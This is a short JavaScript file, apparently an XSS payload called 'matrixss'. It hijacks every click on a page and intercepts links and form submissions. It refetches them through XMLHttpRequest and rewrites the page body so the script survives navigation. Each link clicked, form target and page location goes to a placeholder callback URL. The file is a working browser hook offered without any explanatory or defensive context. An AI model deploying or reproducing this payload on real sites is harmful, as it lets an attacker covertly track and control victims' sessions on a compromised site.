const callbackUrl = "callback-url";

function rewriteDocument(html) {
    document.body.innerHTML = html;
    applyListeners();
    sendCallback("Document rewritten");
}

function handleLinkClick(e) {
    e.preventDefault();
    let xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            rewriteDocument(this.responseText);
        }
    };
    xhttp.open("GET", e.target.href, true);
    xhttp.send();
    sendCallback(`Link clicked: ${e.target.href}`);
}

function handleFormSubmit(form) {
    let xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            rewriteDocument(this.responseText);
        }
    };
    xhttp.open("POST", form.action, true);
    xhttp.send(new FormData(form));
    sendCallback(`Form submitted to: ${form.action}`);
}

function handleClick(e) {
    let target = e.target;

    // If the target is an anchor link, handle the link click
    if (target.tagName === 'A' && target.href) {
        handleLinkClick(e);
    }

    // If the target is a form submit button, handle the form submit
    if ((target.tagName === 'INPUT' && target.type === 'submit') || target.tagName === 'BUTTON') {
        e.preventDefault();
        let form = target.closest('form');
        if (form) {
            handleFormSubmit(form);
        }
    }
}

function applyListeners() {
    document.removeEventListener("click", handleClick); // Remove previous listeners to avoid duplication
    document.addEventListener("click", handleClick);
}

function sendCallback(message) {
    if (callbackUrl) {
        let xhttp = new XMLHttpRequest();
        xhttp.open("POST", callbackUrl, true);
        xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
        xhttp.send(JSON.stringify({
            event: message,
            location: window.location.href,
            timestamp: new Date().toISOString()
        }));
    }
}

function matrixss() {
    applyListeners();
    sendCallback("Matrixss initialized");
}

matrixss();